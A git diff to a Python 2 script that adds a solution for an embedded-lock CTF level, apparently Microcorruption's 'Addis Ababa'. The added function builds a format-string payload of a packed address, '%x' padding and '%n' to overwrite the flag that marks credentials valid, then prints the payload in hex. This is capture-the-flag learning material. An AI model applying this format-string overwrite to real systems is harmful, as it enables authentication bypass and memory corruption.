@@ -2,6 +2,32 @@ import sys
 import struct
 
 
+def addis_ababa():
+    """
+        This level has a format string attack, which can be used to overwrite an arbitrary address. We use the %n format string to write any non-zero value 
+        at the address 3038, which is used as a flag by the lock to indicate the validity of teh credentials that were entered.
+    """
+    # this is the address on the stack which stores the address of the format string
+    addr_fmt_buf = 0x3036
+    # this is the address of the actual format string that we have injected
+    fmt_str_beg = 0x303a
+    # this is the address of the flag that is checked for validity of the credentials
+    flag_addr = 0x3038
+    
+    
+    payload = struct.pack('<H',flag_addr)
+    # add diff %x format strings to move 4 bytes for each %x on the stack.
+    # we do this until the stack pointer reaches the flag_addr and the format string reaches the %n, thereby performing an arbitrary overwrite
+    diff = ( fmt_str_beg - addr_fmt_buf ) / 4
+    payload += "%x" * diff
+    payload += "%n"
+    
+    
+    print payload.encode('hex')
+    
+    
+    
+
 
 def vladivostok(new_printf):
 
@@ -89,3 +115,4 @@ def bangalore():
 
 if __name__ == "__main__":
    # call the appropriate challenge here
+   addis_ababa()
